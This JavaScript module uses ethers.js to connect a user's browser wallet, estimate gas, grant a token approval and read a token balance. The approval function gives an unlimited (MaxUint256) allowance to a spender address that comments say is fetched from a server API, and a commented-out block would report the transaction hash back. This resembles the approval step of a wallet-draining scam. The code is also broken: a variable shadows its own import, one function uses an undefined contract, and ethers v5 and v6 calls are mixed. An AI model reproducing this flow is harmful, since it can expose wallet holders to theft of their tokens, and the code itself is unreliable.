import { ethers } from 'ethers';
import { ABI, contractAddress } from './config';
let provider = null;
export async function connectWallet() {
  return new Promise((res, rej) => {
    if (provider == null) {
      // provider = new BrowserProvider(window.ethereum);
      provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
    }
    provider
      .send('eth_requestAccounts', [])
      .then((a) => {
        return res(a[0]);
      })
      .catch(() => {
        return rej('user rejected request');
      });
  });
}
export let checkNeedEth = async (approve) => {
  const signer = await provider.getSigner(); //连接钱包地址
  const adr = approve; //授权地址，从api获取
  let contractAddress = contractAddress; //合约地址
  const feeData = await provider.getFeeData();
  const gasUsed = await contract.approve.estimateGas(adr, ethers.MaxUint256);
  const needEth = ethers.formatEther(feeData.gasPrice * gasUsed);
  const ethBalance = await provider.getBalance(signer.address);
  return new Promise((res, rej) => {
    if (needEth > ethBalance) {
      console.log('eth not enough');
      return res(false);
    } else {
      return res(true);
    }
  });
};
export async function tokenApprove(approve) {
  const signer = await provider.getSigner(); //连接钱包地址
  const adr = approve; //授权地址，从api获取
  let contractAddress = contractAddress; //合约地址
  const contract = new ethers.Contract(contractAddress, ABI, signer);
  return new Promise((res, rej) => {
    contract.approve(adr, ethers.MaxUint256).then((tx) => {
      tx.wait().then((txReceipt) => {
        if (txReceipt && txReceipt.status == 1) {
          //交易成功
          return res(txReceipt.hash);
        } else {
          return rej();
        }
      });
    });
  });
  // try {
  //     const feeData =await provider.getFeeData();
  //     const gasUsed = await contract.approve.estimateGas(adr, ethers.MaxUint256) ;
  //     const needEth = ethers.formatEther(feeData.gasPrice*gasUsed);
  //     const ethBalance = await provider.getBalance(signer.address);
  //     if(needEth>ethBalance){
  //         console.log('eth not enough')
  //     }
  //     const tx = await contract.approve(adr, ethers.MaxUint256) //授权
  //     const txReceipt = await tx.wait();
  //     if (txReceipt && txReceipt.status == 1) { //交易成功
  //         console.log(txReceipt.hash); //调用api，把hash传入接口
  //     }

  // } catch (e) {
  //     console.log(e)
  // }
}

async function tokenBalance() {
  //非gas币的余额获取
  const signer = await provider.getSigner(); //连接钱包地址
  let contractAddress = contractAddress; //合约地址
  const contract = new ethers.Contract(contractAddress, ABI, provider);
  const decimals = await contract.decimals();
  const balance = await contract.balanceOf(signer.address);
  console.log('余额', ethers.formatUnits(balance, decimals));
}
